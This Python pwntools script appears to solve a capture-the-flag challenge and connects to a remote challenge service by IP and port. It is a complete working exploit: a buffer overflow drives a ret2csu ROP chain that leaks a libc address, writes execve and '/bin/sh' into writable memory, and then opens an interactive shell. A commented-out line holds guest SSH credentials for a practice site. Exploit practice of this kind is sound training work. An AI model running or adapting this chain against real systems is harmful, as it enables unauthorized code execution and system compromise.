#!/usr/bin/python3
from pwn import *

context.binary = elf = ELF("./challenge_patched", checksec = False)
libc = ELF("./libc6_2.31-0ubuntu9.14_amd64.so", checksec = False)

# con = process()
# gdb.attach(con, gdbscript = "b*0x0401203")

#sh = ssh(host='pwnable.kr',user='passcode',port=2222,password='guest')
#con = sh.process("path")

con = remote("34.125.199.248", 7809)

part1 = 0x0040126a
part2 = 0x00401250     
rw = 0x4040f0
ret = 0x401203

### Stage 1: leak libc
payload = b"A"*0x18
payload += p64(part1) + p64(0) + p64(1) + p64(elf.got['puts']) + p64(0) + p64(0) + p64(elf.got['puts'])
payload += p64(part2) + p64(0)*7 + p64(elf.sym['main'])
con.sendlineafter(b"What's your name?\n", payload)
con.recvline()
con.recvline()
puts_leak = u64(con.recv(6)+b"\0\0")
log.info(hex(puts_leak))
libc.address = puts_leak - libc.sym['puts']
log.info(hex(libc.address))

### Stage 2: Write binsh and execve func to rw section
payload = b"A"*0x18
payload += p64(part1) + p64(0) + p64(1) + p64(0) + p64(rw) + p64(0x200) + p64(elf.got['read'])
payload += p64(part2) + p64(0)*7 + p64(elf.sym['main'])
con.sendlineafter(b"What's your name?\n", payload)
time.sleep(1)
con.send(p64(libc.sym['execve']))

payload = b"A"*0x18
payload += p64(part1) + p64(0) + p64(1) + p64(0) + p64(rw+0x20) + p64(0x200) + p64(elf.got['read'])
payload += p64(part2) + p64(0)*7 + p64(elf.sym['main'])
con.sendlineafter(b"What's your name?\n", payload)
time.sleep(1)
con.send(b'/bin/sh\x00')

### Stage 3: Get shell
payload = b"A"*0x18
payload += p64(part1) + p64(0) + p64(1) + p64(rw+0x20) + p64(0) + p64(0) + p64(rw)
payload += p64(part2)
con.sendlineafter(b"What's your name?\n", payload)

con.interactive()
